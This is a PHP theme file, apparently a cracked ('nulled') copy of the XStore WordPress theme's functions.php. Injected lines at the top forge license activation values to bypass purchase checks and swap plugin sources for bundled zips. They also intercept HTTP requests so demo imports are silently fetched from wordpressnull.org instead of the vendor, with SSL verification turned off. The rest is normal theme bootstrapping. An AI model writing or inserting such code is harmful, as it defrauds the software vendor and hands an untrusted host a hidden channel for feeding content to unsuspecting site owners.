<?php

defined( 'ABSPATH' ) || exit( 'Direct script access denied.' );
update_option( 'etheme_is_activated', true );
update_option( 'envato_purchase_code_15780546', 'activated' );
update_option( 'etheme_activated_data', [
'api_key' => 'activated',
'theme' => '_et_',
'purchase' => 'activated',
'item' => [ 'token' => 'activated' ]
] );

add_action( 'tgmpa_register', function(){
if ( isset( $GLOBALS['tgmpa'] ) ) {
$tgmpa_instance = call_user_func( array( get_class( $GLOBALS['tgmpa'] ), 'get_instance' ) );
foreach ( $tgmpa_instance->plugins as $slug => $plugin ) {
if ( $plugin['source_type'] === 'external' ) {
$tgmpa_instance->plugins[ $plugin['slug'] ]['source'] = get_template_directory_uri(). "/plugins/{$plugin['slug']}.zip";
$tgmpa_instance->plugins[ $plugin['slug'] ]['version'] = '';
}
}
}
}, 20 );

add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ){
$search = 'http://8theme.com/import/xstore-demos/';
$replace = 'http://wordpressnull.org/xstore-demos/';
if ( ( strpos( $url, $search ) != false ) && ( strpos( $url, '/versions/' ) == false ) ) {
$url = str_replace( $search, $replace, $url );
return wp_remote_get( $url, [ 'timeout' => 60, 'sslverify' => false ] );
} else {
return false;
}
}, 10, 3 );
	/*
	* Load theme setup
	* ******************************************************************* */
	require_once( get_template_directory() . '/theme/theme-setup.php' );

if ( !apply_filters('xstore_theme_amp', false) ) {

	/*
	* Load framework
	* ******************************************************************* */
	require_once( get_template_directory() . '/framework/init.php' );

	/*
	* Load theme
	* ******************************************************************* */
	require_once( get_template_directory() . '/theme/init.php' );

}
